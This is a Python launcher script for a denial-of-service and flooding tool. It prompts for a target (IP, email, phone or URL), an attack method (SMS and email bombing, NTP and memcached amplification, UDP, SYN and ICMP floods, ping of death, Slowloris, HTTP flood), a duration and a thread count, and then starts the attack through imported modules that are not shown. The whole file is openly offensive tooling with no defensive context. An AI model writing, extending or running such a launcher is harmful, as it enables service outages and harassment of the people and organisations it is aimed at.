# Created by LimerBoy remasterd by pinkyhax
# Import modules
import os
import sys


# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args

target = input("Target (IP/PORT/EMAIL/PHONE/HTTPS) : ")
method = input("Method <SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP> : ")
time = input("Time in Seconds: ")
threads = input("Threads: 1-255 : ")




if __name__ == "__main__":
    # Print help
    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
